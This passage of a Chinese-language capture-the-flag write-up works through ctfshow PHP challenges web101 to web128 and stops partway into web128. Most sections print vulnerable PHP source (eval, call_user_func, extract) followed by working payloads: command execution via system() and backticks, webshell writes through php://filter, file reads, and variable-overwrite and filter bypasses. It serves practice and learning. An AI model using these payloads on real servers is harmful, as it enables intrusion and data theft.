web101</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-09-22 00:26:48</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br>*/<br><br>highlight_file(__FILE__);<br>include(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br>//flag <span class="hljs-keyword">in</span> class ctfshow;<br><span class="hljs-variable">$ctfshow</span> = new ctfshow();<br><span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v0</span>=is_numeric(<span class="hljs-variable">$v1</span>) and is_numeric(<span class="hljs-variable">$v2</span>) and is_numeric(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;<span class="hljs-variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-variable">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>没遇过学习一下，反射，ReflectionClass：一个反射类，功能十分强大，内置了各种获取类信息的方法，创建方式为new ReflectionClass(str 类名)，可以用echo new ReflectionClass(‘className’)打印类的信息。</p><p>ReflectionObject：另一个反射类，创建方式为new ReflectionObject(对象名)。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=<span class="hljs-built_in">echo</span> new Reflectionclass&amp;v3=;<br></code></pre></td></tr></table></figure><h2 id="web102"><a class="markdownIt-Anchor" href="#web102"></a> web102</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: atao</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-23 20:59:43</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v4</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v4</span>)&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$v3</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>call_user_func</code>函数是用于调用一个回调函数，$s从第二个开始读取，<code>file_put_contents</code>可以写入文件</p><p>v3用伪协议写入一个文件<code>v3=php://filter/write=convert.base64-decode/resource=1.php</code></p><p>还需要讲的是短标签<code>&lt;?=</code>就相当于<code>&lt;?php echo</code>，我们需要构造,末尾有空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`cat *`; <br></code></pre></td></tr></table></figure><p>先进行base64,原因是我们写入的时候用了base64，然后进行hex,最后再编码前面加两位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">v2=115044383959474e686443417159447367<br></code></pre></td></tr></table></figure><p>最后<code>v1=hex2bin</code>进行转化进行，到1.php里看答案</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v2=115044383959474e686443417159447367&amp;v3=php://filter/write=convert.base64-decode/resource=1.php<br></code></pre></td></tr></table></figure><h2 id="web103"><a class="markdownIt-Anchor" href="#web103"></a> web103</h2><p>用上面102的payload可以正常打通</p><h2 id="web104"><a class="markdownIt-Anchor" href="#web104"></a> web104</h2><h3 id="0x01-9"><a class="markdownIt-Anchor" href="#0x01-9"></a> 0x01</h3><p>数组绕过</p><h3 id="0x02-9"><a class="markdownIt-Anchor" href="#0x02-9"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v2=aaK1STfY<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">v1=aaroZmOk<br></code></pre></td></tr></table></figure><h2 id="web105"><a class="markdownIt-Anchor" href="#web105"></a> web105</h2><p>本地考察了变量覆盖</p><p>先上payload</p><h3 id="0x01-10"><a class="markdownIt-Anchor" href="#0x01-10"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?suces=flag<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">error=suces<br></code></pre></td></tr></table></figure><p>原理就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>c</mi><mi>e</mi><mi>s</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">suces=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>flag,然后post发<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>r</mi><mi>r</mi><mi>o</mi><mi>r</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">error=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>suces，通过串联，达成了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>r</mi><mi>r</mi><mi>o</mi><mi>r</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">error=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>flag;</p><h3 id="0x02-10"><a class="markdownIt-Anchor" href="#0x02-10"></a> 0x02</h3><p>清空内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?suces=flag&amp;flag=<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag=<br></code></pre></td></tr></table></figure><h2 id="web106"><a class="markdownIt-Anchor" href="#web106"></a> web106</h2><p>同web104</p><h2 id="web107"><a class="markdownIt-Anchor" href="#web107"></a> web107</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v3=1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">v1=flag=c4ca4238a0b923820dcc509a6f75849b<br></code></pre></td></tr></table></figure><p><code>parse_str</code> 将 <code>$v1</code> 中的查询字符串解析成一个关联数组，并将解析结果存储在 <code>$v2</code> 中。</p><p>就相当于$v2[flag]=c4ca4238a0b923820dcc509a6f75849b，控制两边相等就行了</p><h2 id="web108"><a class="markdownIt-Anchor" href="#web108"></a> web108</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=a%00778<br></code></pre></td></tr></table></figure><p>ereg用于检测是否只包含字母（大小写），<code>0x36d</code> 的十进制值是 877。反转 <code>&quot;877&quot;</code> 得到的字符串是 <code>&quot;778&quot;</code>，</p><p>不过这里的 <code>ereg()</code> 存在截断漏洞, <code>%00</code> 后的字符串不解析构造 <code>a%00778</code> 来绕过 <code>ereg()</code> 的检测</p><h2 id="web109"><a class="markdownIt-Anchor" href="#web109"></a> web109</h2><p>使用原生类的内置类进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=DirectoryIterator&amp;v2=system(<span class="hljs-built_in">ls</span>)<br></code></pre></td></tr></table></figure><p>然后使用映射类读取flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=Reflectionclass&amp;v2=system(<span class="hljs-string">&#x27;tac fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=Exception&amp;v2=system(<span class="hljs-string">&#x27;tac fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=Error&amp;v2=system(<span class="hljs-string">&#x27;tac fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="web110"><a class="markdownIt-Anchor" href="#web110"></a> web110</h2><p>根据题目给的hint，先上payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=FilesystemIterator&amp;v2=getcwd<br></code></pre></td></tr></table></figure><p>FilesystemIterator：：__construct — 构造一个新的文件系统迭代器</p><p><code>getcwd()</code> 返回当前工作目录, 即 /var/ww/html。类里面刚好有 <code>__toString</code> 可以 echo 输出</p><h2 id="web111"><a class="markdownIt-Anchor" href="#web111"></a> web111</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=ctfshow&amp;v2=GLOBALS<br></code></pre></td></tr></table></figure><p>进行变量覆盖</p><h2 id="web112"><a class="markdownIt-Anchor" href="#web112"></a> web112</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/resource=flag.php<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=compress.zlib://flag.php<br></code></pre></td></tr></table></figure><h2 id="web113"><a class="markdownIt-Anchor" href="#web113"></a> web113</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=compress.zlib://flag.php<br></code></pre></td></tr></table></figure><p>官p是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p<br>roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro<br>c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/<br>self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se<br>lf/root/proc/self/root/var/www/html/flag.php<br></code></pre></td></tr></table></figure><p>这是一个 Linux 环境中的路径表达式，表示通过不断递归访问 <code>/proc/self/root</code> 来尝试访问最终的目标文件 <code>/var/www/html/flag.php</code>。利用函数所能处理的长度限制进行目录溢出,超过is_file能处理的最大长度就不认为是个文件了。</p><h2 id="web114"><a class="markdownIt-Anchor" href="#web114"></a> web114</h2><h3 id="0x01-11"><a class="markdownIt-Anchor" href="#0x01-11"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter//resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="0x02-11"><a class="markdownIt-Anchor" href="#0x02-11"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=Php://filter/zlib.deflate|zlib.inflate/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web115"><a class="markdownIt-Anchor" href="#web115"></a> web115</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=%0c36<br></code></pre></td></tr></table></figure><p>利用 PHP 的宽松类型比较特性</p><p>由于 <code>$num</code> 的原始值是 <code>&quot;\x0c36&quot;</code>，它通过了 <code>is_numeric()</code> 检查，且不严格等于 <code>'36'</code>，同时经过 <code>filter()</code> 处理后的值仍为 <code>'36'</code>。</p><h2 id="web123"><a class="markdownIt-Anchor" href="#web123"></a> web123</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Firebasky</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">18</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);  <br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一开始是想执行fl0g其实是执行不了的，真是可以传值的只有利用fun，执行echo $flag，这里因为php特性改成[,再传给CTF_SHOW，就达成了判断条件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=1&amp;fun= <span class="hljs-built_in">echo</span> <span class="hljs-variable">$flag</span><br></code></pre></td></tr></table></figure><h2 id="web125"><a class="markdownIt-Anchor" href="#web125"></a> web125</h2><h3 id="0x01-12"><a class="markdownIt-Anchor" href="#0x01-12"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=1&amp;fun=var_export(get_defined_vars())<br></code></pre></td></tr></table></figure><p>无参数绕过常见的一种方法</p><h3 id="0x02-12"><a class="markdownIt-Anchor" href="#0x02-12"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=1&amp;fun=highlight_file(<span class="hljs-variable">$_GET</span>[1])<br></code></pre></td></tr></table></figure><p><code>?1=flag.php</code></p><h3 id="0x03-3"><a class="markdownIt-Anchor" href="#0x03-3"></a> 0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=1&amp;fun=include(<span class="hljs-variable">$_GET</span>[1])<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web126"><a class="markdownIt-Anchor" href="#web126"></a> web126</h2><h3 id="0x01-13"><a class="markdownIt-Anchor" href="#0x01-13"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str(<span class="hljs-variable">$a</span>[1])<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a=1+fl0g=flag_give_me<br></code></pre></td></tr></table></figure><p><code>?a=1+fl0g=flag_give_me</code>。在之前的代码中存在 <code>parse_str($a[1])</code>，并且 <code>$a[1]</code> 是可控的输入，那么这里的查询字符串会被 <code>parse_str()</code> 函数解析。</p><p><code>$a[1]</code> 包含 <code>fl0g=flag_give_me</code>，<code>parse_str($a[1])</code> 会将它解析为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$fl0g</span> = <span class="hljs-string">&quot;flag_give_me&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="0x02-13"><a class="markdownIt-Anchor" href="#0x02-13"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert(<span class="hljs-variable">$a</span>[0])<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-variable">$fl0g</span>=flag_give_me<br></code></pre></td></tr></table></figure><h2 id="web127"><a class="markdownIt-Anchor" href="#web127"></a> web127</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-10 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-10 21:52:49</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$ctf_show</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>);<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br><br><span class="hljs-comment">//特殊字符检测</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;嗯哼？&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctf_show</span>===<span class="hljs-string">&#x27;ilove36d&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h3 id="0x01-14"><a class="markdownIt-Anchor" href="#0x01-14"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ctf show=ilove36d<br></code></pre></td></tr></table></figure><p>点或空格会被转化为下划线，由于点被过滤 ，所以可以用上空格。</p><h3 id="0x02-14"><a class="markdownIt-Anchor" href="#0x02-14"></a> 0x02</h3><p>$_SERVER[‘QUERY_STRING’];获取的查询语句是服务端还没url解码之前的字符串，所以对_进行一次url编码也能绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ctf%5fshow=ilove36d<br></code></pre></td></tr></table></figure><h2 id="web128"><a class="markdownIt-Anchor" href="#web128"></a> web128</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 